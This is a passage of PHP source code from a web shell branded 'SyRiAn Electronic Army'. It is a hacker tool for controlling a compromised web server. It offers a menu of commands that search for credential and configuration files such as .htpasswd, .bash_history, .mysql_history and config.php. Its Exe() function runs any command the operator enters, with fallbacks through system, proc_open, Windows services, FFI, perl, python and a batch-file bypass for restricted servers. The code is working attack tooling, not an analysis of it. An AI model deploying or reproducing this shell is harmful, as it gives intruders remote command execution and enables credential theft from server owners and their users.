		<option value='find . -type f -name .bash_history'>find .bash_history files in current dir</option>
		<option value='find / -type f -name .fetchmailrc'>find all .fetchmailrc files</option>
		<option value='find . -type f -name .fetchmailrc'>find .fetchmailrc files in current dir</option>
		<option value='locate httpd.conf'>locate httpd.conf files</option>
		<option value='locate vhosts.conf'>locate vhosts.conf files</option>
		<option value='locate proftpd.conf'>locate proftpd.conf files</option>
		<option value='locate psybnc.conf'>locate psybnc.conf files</option>
		<option value='locate my.conf'>locate my.conf files</option>
		<option value='locate admin.php'>locate admin.php files</option>
		<option value='locate cfg.php'>locate cfg.php files</option>
		<option value='locate conf.php'>locate conf.php files</option>
		<option value='locate config.dat'>locate config.dat files</option>
		<option value='locate config.php'>locate config.php files</option>
		<option value='locate config.inc'>locate config.inc files</option>
		<option value='locate config.inc.php'>locate config.inc.php</option>
		<option value='locate config.default.php'>locate config.default.php files</option>
		<option value='locate config'>locate config* files </option>
		<option value='locate \".conf\"'>locate .conf files</option>
		<option value='locate \".pwd\"'>locate .pwd files</option>
		<option value='locate \".sql\"'>locate .sql files</option>
		<option value='locate \".htpasswd\"'>locate .htpasswd files</option>
		<option value='locate \".bash_history\"'>locate .bash_history files</option>
		<option value='locate \".mysql_history\"'>locate .mysql_history files</option>
		<option value='locate \".fetchmailrc\"'>locate .fetchmailrc files</option>
		<option value='locate backup'>locate backup files</option>
		<option value='locate dump'>locate dump files</option>
		<option value='locate priv'>locate priv files</option>
		</select>
		";
	}
}
function CSS($sh3llColor) {
	$css =  "
	<style>
	BODY
	{
		FONT-FAMILY: Verdana; 
		margin: 2;
		background-color: #000000;
		color:white;
		font-size:10pt;
	}
	sy  
	{
		color:".$sh3llColor.";
		font-size:7pt;
	}
	#Box
	{
		color:".$sh3llColor.";
		background-color:#000;
		font-size:14px;
		font-weight:bold;

		border:none;
	}
	table 
	{
		border:none;
		BORDER:  #eeeeee  outset;
		BACKGROUND-COLOR: #000000;
		color: #cccccc;
		font-size:10px;
	}
	tr 
	{
		BORDER-RIGHT:  #cccccc 1px solid;
		BORDER-TOP:    #cccccc 1px solid;
		BORDER-LEFT:   #cccccc 1px solid;
		BORDER-BOTTOM: #cccccc 1px solid;
		color: #ffffff;
	}
	td 
	{
		BORDER-RIGHT:  #cccccc 1px solid;
		BORDER-TOP:    #cccccc 1px solid;
		BORDER-LEFT:   #cccccc 1px solid;
		BORDER-BOTTOM: #cccccc 1px solid;
		color: #cccccc;
	}

	input 
	{
		BORDER-RIGHT:  ".$sh3llColor." 1px solid;
		BORDER-TOP:    ".$sh3llColor." 1px solid;
		BORDER-LEFT:   ".$sh3llColor." 1px solid;
		BORDER-BOTTOM: ".$sh3llColor." 1px solid;
		BACKGROUND-COLOR: #333333;
		font: 9pt tahoma;
		color: #ffffff;
	}
	select 
	{
		BORDER-RIGHT:  #ffffff 1px solid;
		BORDER-TOP:    #999999 1px solid;
		BORDER-LEFT:   #999999 1px solid;
		BORDER-BOTTOM: #ffffff 1px solid;
		BACKGROUND-COLOR: #000000;
		font: 9pt tahoma;
		color: #CCCCCC;;
	}
	submit 
	{
		BORDER:  1px outset buttonhighlight;
		BACKGROUND-COLOR: #272727;
		width: 40%;
		color: #cccccc;
	}
	textarea 
	{
		BORDER-RIGHT:  #ffffff 1px solid;
		BORDER-TOP:    #999999 1px solid;
		BORDER-LEFT:   #999999 1px solid;
		BORDER-BOTTOM: #ffffff 1px solid;
		BACKGROUND-COLOR: #333333;
		color: #ffffff;
	}
	.Save{
		width:500px;	
		border-color:red;
	}
	A:link {COLOR:".$sh3llColor."; TEXT-DECORATION: none;}
	A:visited { COLOR:".$sh3llColor."; TEXT-DECORATION: none;}
	A:active {COLOR:".$sh3llColor."; TEXT-DECORATION: none;}
	A:hover {color:blue;TEXT-DECORATION: none;}
	</style>
	<script>
	function openPHPInfo(){my_window= window.open (\"?info=getPhpInfo\",\"PHP Info\",\"width=800,height=600,scrollbars=1\");	}
	function AddAlias(){document.getElementById('CMD_Line').value = document.getElementById('alias').value; }
	function addUploadInput(){document.getElementById('uploadInput').innerHTML += '<input type=\'file\' name=\'uploadfile[]\'>';	}
	function change_dir_mode() {
		var dir_mode = document.getElementById('dir_mode').value;
		document.location = '?dir_mode='+dir_mode;
	}
	</script>
	";
	return $css;
}
function filter($string) {
	if(get_magic_quotes_gpc() != 0){return stripslashes($string);	}
	else{return $string;	}
}
function footer() {
	echo '
	<table width="100%">
	<tr>
	<td width="100%"><center>
	<sy>  ~~<< </sy>SyRiAn Electronic Army<sy> >>~~</sy></b><br/>
	<sy>  ~~<< </sy><a href="http://www.syrian-es.com" target="_blank">www.syrian-es.com</a><sy> >>~~</sy></b><br />
	<sy>  ~~<< </sy>sea.coders@hotmail.com<sy> >>~~</sy></b>
	</center></td>
	</tr>
	</table>
	</body></html>
	';
}
function print_exe_method() {
	global $os; global $exec_method;
	if($os == "Linux") {
		?>
		<select name="exe_method" >
			<option value="exec" <?php if($exec_method == "exec") {echo "selected";} ?>>exec()</option>
			<option value="system" <?php if($exec_method == "system") {echo "selected";} ?>>system</option>
			<option value="shell_exec" <?php if($exec_method == "shell_exec") {echo "selected";} ?>>shell_exec</option>
			<option value="passthru" <?php if($exec_method == "passthru") {echo "selected";} ?>>passthru()</option>
			<option value="proc_open" <?php if($exec_method == "proc_open") {echo "selected";} ?>>proc_open()</option>
			<option value="popen" <?php if($exec_method == "popen") {echo "selected";} ?>>popen()</option>
			<option value="perl" <?php if($exec_method == "perl") {echo "selected";} ?>>perl</option>
			<option value="python" <?php if($exec_method == "python") {echo "selected";} ?>>python</option>
		</select>
		<?php
	} else {
		?>
		<select name="exe_method" >
			<option value="exec" <?php if($exec_method == "exec") {echo "selected";} ?>>exec()</option>
			<option value="system" <?php if($exec_method == "system") {echo "selected";} ?>>system()</option>
			<option value="shell_exec" <?php if($exec_method == "shell_exec") {echo "selected";} ?>>shell_exec()</option>
			<option value="passthru" <?php if($exec_method == "passthru") {echo "selected";} ?>>passthru()</option>
			<option value="proc_open" <?php if($exec_method == "proc_open") {echo "selected";} ?>>proc_open()</option>
			<option value="popen" <?php if($exec_method == "popen") {echo "selected";} ?>>popen()</option>
			<option value="win_shell_execute" <?php if($exec_method == "win_shell_execute") {echo "selected";} ?>>win_shell_execute()</option>
			<option value="win32_create_service" <?php if($exec_method == "win32_create_service") {echo "selected";} ?>>win32_create_service()</option>
			<option value="ffi" <?php if($exec_method == "ffi") {echo "selected";} ?>>ffi</option>
			<option value="perl" <?php if($exec_method == "perl") {echo "selected";} ?>>perl</option>
			<option value="python" <?php if($exec_method == "python") {echo "selected";} ?>>python</option>
			<option value="slash_bypass <?php if($exec_method == "slash_bypass") {echo "selected";} ?>">slash bypass</option>
		</select>
		<?php
	}
}
function Exe($command) {
	global $dir;global $os;global $exec_method;
	$command = filter($command);
	
	if($exec_method == "exec") {
		exec($command,$output);echo join("\n",$output);
	} else if($exec_method == "system") {
		system($command);
	} else if($exec_method == "shell_exec") {
		echo shell_exec($command);
	} else if($exec_method == "passthru") {
		passthru($command);
	} else if($exec_method == "proc_open") {
		echo proc_exec($command,$dir);
	} else if($exec_method == "popen") {
		$fp = popen($command,"r");{while(!feof($fp)){$result.=fread($fp,1024);}pclose($fp);}echo convert_cyr_string($result,"d","w");
	} else if($exec_method == "win_shell_execute") {
		echo winshell($command);
	} else if($exec_method == "win32_create_service") {
		echo srvshell($command);
	} else if($exec_method == "ffi") {
		echo ffishell($command);
	} else if($exec_method == "perl") {
		echo perlshell($command);
	} else if($exec_method == "python") {
		echo python_eval("import os\nos.system('".$command."')");
	} else if($exec_method == "slash_bypass") {
		echo slashBypass($command);
	}
}
function proc_exec($com , $dir) {
    $start_pipe=array(0=>array("pipe","w"),1=>array("pipe","w"));
    $process=proc_open($com,$start_pipe,$pipes,$dir,NULL);
    return stream_get_contents($pipes[1]);
}
function winshell($command) {
	$name=whereistmP()."\\".uniqid('NJ');
	win_shell_execute('cmd.exe','',"/C $command >\"$name\"");
	sleep(1);
	$exec=file_get_contents($name);
	DeleteFile($name);
	return $exec;
}
function srvshell($command) {
	$name=whereistmP()."\\".uniqid('NJ');
	$n=uniqid('NJ');
	$cmd=(empty($_SERVER['ComSpec']))?'d:\\windows\\system32\\cmd.exe':$_SERVER['ComSpec'];
	win32_create_service(array('service'=>$n,'display'=>$n,'path'=>$cmd,'params'=>"/c $command >\"$name\""));
	win32_start_service($n);
	win32_stop_service($n);
	win32_delete_service($n);
	while(!file_exists($name))sleep(1);
	$exec=file_get_contents($name);
	DeleteFile($name);
	return $exec;
}
function ffishell($command) {
	$name=whereistmP()."\\".uniqid('NJ');
	$api=new ffi("[lib='kernel32.dll'] int WinExec(char *APP,int SW);");
	$res=$api->WinExec("cmd.exe /c $command >\"$name\"",0);
	while(!file_exists($name))sleep(1);
	$exec=file_get_contents($name);
	DeleteFile($name);
	return $exec;
}
function perlshell($command) {
	$perl=new perl();
	ob_start();
	$perl->eval("system('".$command."')");
	$exec=ob_get_contents();
	ob_end_clean();
	return $exec;
}
function slashBypass($cmd) {
	GenerateFile("cmd.bat","$cmd>sy3.txt"."\r\n exit");
	exec("\start cmd.bat");
	$content = file_get_contents('sy3.txt');
	unlink('sy3.txt');
	return $content;
}
function GenerateFile($name,$content) {
	if(function_exists('fopen') && function_exists('fclose')) {
		$file = fopen($name,"w+");
		if($file) {
			if(function_exists('fwrite')){$writeFile = fwrite($file,$content); }	
			else if (function_exists('fputs')){$writeFile = fputs($file,$content); }
			else if (function_exists('file_put_contents')){$writeFile = file_put_contents($file,$content);}
			if(!$writeFile){return false;}
		}
		else{return false;}fclose($file);return true;
	}
}
function ScanDirs() {
	global $os; global $dir;global $safeMode;global $dir_mode;
	if($dir_mode == "cmd"){if($os == "Windows"){Exe('dir');}else{ Exe('ls -lia');}}
	else {
		$result .= "Perms	Size	Time		Owner/Group	R/W	Type	File
-----------------------------------------------------------------------------
";
		$handel = opendir($dir);
		while(($file = readdir($handel))!= false) 
		{
			$size = filesize($file);
			if(filetype($file) == "dir"){$type = "<DIR>";}else {$type = "<FILE>";}
			if(fileowner($file)){$owner = fileowner($file);}else{$owner = "NONE";}
			if(filegroup($file)){$group = filegroup($file);}else{$group = "NONE";}
			$perms = fileperms($file);
			$time = date("y/m/d", filectime($file));
			if(is_writable($file)){$isWritable = "Y";}else{$isWritable = "N";}
			if(is_readable($file)){$isReadable = "Y";}else{$isReadable = "N";}
			$result .= $perms."	".$size."	".$time."	".$owner."/".$group."	".$isReadable."/".$isWritable."	".$type."	".$file."
";
		}
	}
	return $result;
}
echo footer();
?>
